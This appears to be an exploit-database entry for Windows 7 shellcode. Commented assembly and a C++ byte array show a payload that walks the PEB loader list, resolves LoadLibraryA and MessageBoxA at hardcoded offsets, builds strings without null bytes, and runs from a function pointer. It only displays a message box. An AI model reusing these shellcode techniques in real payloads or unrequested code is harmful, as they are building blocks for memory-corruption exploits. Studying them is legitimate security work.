@@ -1,0 +1,206 @@
+id: 18903
+date: 07/02/2012
+title: win32/7 Ultimate MessageBox ShellCode
+author: Ayrbyte
+cves: 
+
+/*
+    title : win32/7 Ultimate MessageBox ShellCode
+    Author: Ayrbyte
+    Link : - 
+    Version: -
+    Category: local
+    Tested on: Windows 7 Ultimate
+    Code : c++
+    Site : 1337day.com Inj3ct0r Exploit Database
+
+ASSUME FS:NOTHING
+XOR ESI,ESI
+XOR ECX,ECX            ; ECX = 0
+MOV ESI,FS:[ECX + 30h] ; ESI = &(PEB) ([FS:0x30])
+MOV ESI,[ESI + 0Ch]    ; ESI = PEB->Ldr
+MOV ESI,[ESI + 1Ch]    ; ESI = PEB->Ldr.InInitOrder
+xor ebx,ebx
+next_module1:
+inc ebx
+MOV EBP,[ESI + 08h]    ; EBP = InInitOrder[X].base_address
+MOV EDI,[ESI + 20h]    ; EBP = InInitOrder[X].module_name (unicode)
+MOV ESI,[ESI]          ; ESI = InInitOrder[X].flink (next module)
+mov eax,11111111h
+mov ecx,11111114h
+sub ecx,eax
+mov edx,ecx            ; ecx = 3 kernel32 berada di urutan ke 3 
+CMP ebx,edx
+JNE next_module1       ; No: mencoba module berikutnya.
+                       ; EBP berisi base address kernel32
+mov eax,11111111h
+mov ecx,11112111h
+sub ecx,eax
+add ebp,ecx          ; offset awal kernel32.dll
+mov eax,11111111h
+mov ecx,11162975h
+sub ecx,eax
+mov eax,ecx                
+add ebp,eax            ; EBP ditambah 51864 agar menjadi offset LoadLibrary A
+
+;--->Meload user32 library<---
+;memasukkan 'user32' string ke stack
+mov edx,esp
+add edx,32
+mov ecx,72657375h   ;75657375h = 'user' dalam format little endian
+mov ds:[edx],ecx    ;memasukkan 'user' ke stack
+mov eax,11111111h
+mov ecx,11114344h
+sub ecx,eax         ;membuat ecx terisi oleh 3233h = '32' dalam format little endian
+mov ds:[edx+4],ecx  ;memasukkan '32' ke stack
+                    ;sekarang edx menjadi offset string 'user32'
+push edx            ;push 'user32'
+call ebp            ;Calling kernel32dll.LoadLibraryA
+add esp,4
+
+;--->Menemukan Address MessageBoxA<---
+ASSUME FS:NOTHING
+XOR ESI,ESI
+XOR ECX,ECX            ; ECX = 0
+MOV ESI,FS:[ECX + 30h] ; ESI = &(PEB) ([FS:0x30])
+MOV ESI,[ESI + 0Ch]    ; ESI = PEB->Ldr
+MOV ESI,[ESI + 1Ch]    ; ESI = PEB->Ldr.InInitOrder
+xor ebx,ebx
+next_module2:
+inc ebx
+MOV EBP,[ESI + 08h]    ; EBP = InInitOrder[X].base_address
+MOV EDI,[ESI + 20h]    ; EBP = InInitOrder[X].module_name (unicode)
+MOV ESI,[ESI]          ; ESI = InInitOrder[X].flink (next module)
+mov eax,11111111h
+mov ecx,11111119h
+sub ecx,eax
+mov edx,ecx            ; ecx = 9 user32 berada di urutan ke 9 
+CMP ebx,edx;
+JNE next_module2       ; No: mencoba module berikutnya.
+                       ; EBP berisi base address user32
+mov eax,11111111h
+mov ecx,11112111h
+sub ecx,eax
+add ebp,ecx          ; offset awal user32.dll
+mov eax,11111111h
+mov ecx,1116EB82h
+sub ecx,eax
+mov eax,ecx                
+add ebp,eax            ; EBP ditambah 5DA71 agar menjadi offset MessageBoxA
+
+;--->Mempersiapkan String Untuk Judul Dan Isi Messagebox<---
+mov eax,11111111h
+mov ecx,11111295h
+sub ecx,eax
+sub esp,ecx
+;offset edx judul 'MessageBoxA By Ayrbyte'
+mov edx,esp
+mov ecx,7373654Dh      ;'Mess'
+mov ds:[edx],ecx        
+mov ecx,42656761h      ;'ageB'
+mov ds:[edx+4],ecx
+mov ecx,2041786Fh      ;'oxA '
+mov ds:[edx+8],ecx
+mov ecx,41207942h      ;'By A'
+mov ds:[edx+12],ecx
+mov ecx,79627279h      ;'yrby'
+mov ds:[edx+16],ecx
+mov eax,11111111h
+mov ecx,11117685h      
+sub ecx,eax            ;'te'
+mov ds:[edx+20],ecx
+
+;offset ebx+23 isi 'MessageBoxA 'the hard way' By Ayrbyte'
+mov ebx,edx
+add ebx,20
+mov ecx,7373654dh      ;'Mess'
+mov ds:[ebx+4],ecx
+mov ecx,42656761h      ;'ageB'
+mov ds:[ebx+8],ecx
+mov ecx,2041786Fh      ;'oxA '
+mov ds:[ebx+12],ecx
+mov ecx,65687427h      ;''the'
+mov ds:[ebx+16],ecx
+mov ecx,72616820h      ;' har'
+mov ds:[ebx+20],ecx
+mov ecx,61772064h      ;'d wa'
+mov ds:[ebx+24],ecx
+mov ecx,42202779h      ;'y' B'
+mov ds:[ebx+28],ecx
+mov ecx,79412079h      ;'y Ay'
+mov ds:[ebx+32],ecx
+mov ecx,74796272h      ;'rbyt'
+mov ds:[ebx+36],ecx
+mov eax,11111111h
+mov ecx,11111176h   
+sub ecx,eax            ;'e'
+mov ds:[ebx+40],ecx
+add ebx,4
+
+;--->Calling MessageBoxA<---
+xor eax,eax            ; eax = NULL / 0
+push eax
+push edx
+push ebx
+push eax
+call ebp               ;calling user32.MessageBoxA
+
+;--->Calling ExitProcess<---
+ASSUME FS:NOTHING
+XOR ESI,ESI
+XOR ECX,ECX            ; ECX = 0
+MOV ESI,FS:[ECX + 30h] ; ESI = &(PEB) ([FS:0x30])
+MOV ESI,[ESI + 0Ch]    ; ESI = PEB->Ldr
+MOV ESI,[ESI + 1Ch]    ; ESI = PEB->Ldr.InInitOrder
+xor ebx,ebx
+next_module3:
+inc ebx
+MOV EBP,[ESI + 08h]    ; EBP = InInitOrder[X].base_address
+MOV EDI,[ESI + 20h]    ; EBP = InInitOrder[X].module_name (unicode)
+MOV ESI,[ESI]          ; ESI = InInitOrder[X].flink (next module)
+mov eax,11111111h
+mov ecx,11111113h
+sub ecx,eax
+mov edx,ecx            ; ecx = 3 user32 berada di urutan ke 3 
+CMP ebx,edx;
+JNE next_module3       ; No: mencoba module berikutnya.
+                       ; EBP berisi base address user32
+mov eax,11111111h
+mov ecx,11142637h
+sub ecx,eax
+add ebp,ecx
+call ebp               ; Calling KERNELBASEDLL.ExitProcess
+*/
+
+#include <iostream>
+using namespace std;
+
+char code[] =  
+"\x33\xF6\x33\xC9\x64\x8B\x71\x30\x8B\x76\x0C\x8B\x76\x1C\x33\xDB\x43\x8B\x6E"
+"\x08\x8B\x7E\x20\x8B\x36\xB8\x11\x11\x11\x11\xB9\x14\x11\x11\x11\x2B\xC8\x8B"
+"\xD1\x3B\xDA\x75\xE5\xB8\x11\x11\x11\x11\xB9\x11\x21\x11\x11\x2B\xC8\x03\xE9"
+"\xB8\x11\x11\x11\x11\xB9\x75\x29\x16\x11\x2B\xC8\x8B\xC1\x03\xE8\x8B\xD4\x83"
+"\xC2\x20\xB9\x75\x73\x65\x72\x89\x0A\xB8\x11\x11\x11\x11\xB9\x44\x43\x11\x11"
+"\x2B\xC8\x89\x4A\x04\x52\xFF\xD5\x83\xC4\x04\x33\xF6\x33\xC9\x64\x8B\x71\x30"
+"\x8B\x76\x0C\x8B\x76\x1C\x33\xDB\x43\x8B\x6E\x08\x8B\x7E\x20\x8B\x36\xB8\x11"
+"\x11\x11\x11\xB9\x19\x11\x11\x11\x2B\xC8\x8B\xD1\x3B\xDA\x75\xE5\xB8\x11\x11"
+"\x11\x11\xB9\x11\x21\x11\x11\x2B\xC8\x03\xE9\xB8\x11\x11\x11\x11\xB9\x82\xEB"
+"\x16\x11\x2B\xC8\x8B\xC1\x03\xE8\xB8\x11\x11\x11\x11\xB9\x95\x12\x11\x11\x2B"
+"\xC8\x2B\xE1\x8B\xD4\xB9\x4D\x65\x73\x73\x89\x0A\xB9\x61\x67\x65\x42\x89\x4A"
+"\x04\xB9\x6F\x78\x41\x20\x89\x4A\x08\xB9\x42\x79\x20\x41\x89\x4A\x0C\xB9\x79"
+"\x72\x62\x79\x89\x4A\x10\xB8\x11\x11\x11\x11\xB9\x85\x76\x11\x11\x2B\xC8\x89"
+"\x4A\x14\x8B\xDA\x83\xC3\x14\xB9\x4D\x65\x73\x73\x89\x4B\x04\xB9\x61\x67\x65"
+"\x42\x89\x4B\x08\xB9\x6F\x78\x41\x20\x89\x4B\x0C\xB9\x27\x74\x68\x65\x89\x4B"
+"\x10\xB9\x20\x68\x61\x72\x89\x4B\x14\xB9\x64\x20\x77\x61\x89\x4B\x18\xB9\x79"
+"\x27\x20\x42\x89\x4B\x1C\xB9\x79\x20\x41\x79\x89\x4B\x20\xB9\x72\x62\x79\x74"
+"\x89\x4B\x24\xB8\x11\x11\x11\x11\xB9\x76\x11\x11\x11\x2B\xC8\x89\x4B\x28\x83"
+"\xC3\x04\x33\xC0\x50\x52\x53\x50\xFF\xD5\x33\xF6\x33\xC9\x64\x8B\x71\x30\x8B"
+"\x76\x0C\x8B\x76\x1C\x33\xDB\x43\x8B\x6E\x08\x8B\x7E\x20\x8B\x36\xB8\x11\x11"
+"\x11\x11\xB9\x13\x11\x11\x11\x2B\xC8\x8B\xD1\x3B\xDA\x75\xE5\xB8\x11\x11\x11"
+"\x11\xB9\x37\x26\x14\x11\x2B\xC8\x03\xE9\xFF\xD5";
+
+int main(){((void (*)(void))code)();}
+
+
+
+#  0day.today [2023-03-24]  #
